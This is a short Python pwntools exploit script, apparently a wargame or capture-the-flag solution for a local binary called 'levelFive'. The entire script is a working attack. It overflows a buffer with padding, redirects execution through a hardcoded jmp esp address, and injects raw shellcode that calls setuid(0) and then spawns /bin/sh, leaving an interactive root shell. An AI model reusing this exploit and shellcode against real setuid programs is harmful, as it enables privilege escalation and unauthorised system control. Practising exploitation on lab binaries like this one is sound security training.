#!/usr/bin/python2
from pwn import process, p32

shell = process("./levelFive")

offset = 16
junk = b"A" * offset

jmpesp = p32(0xf7dd4ff7)

setuid = b"1\xdbj\x17X\xcd\x80"

shellcode  = b""
shellcode += b"\x6a\x0b\x58\x99\x52\x68\x2f"
shellcode += b"\x2f\x73\x68\x68\x2f\x62\x69"
shellcode += b"\x6e\x89\xe3\x31\xc9\xcd\x80"

shell.sendline(junk + jmpesp + setuid + shellcode)
shell.interactive()
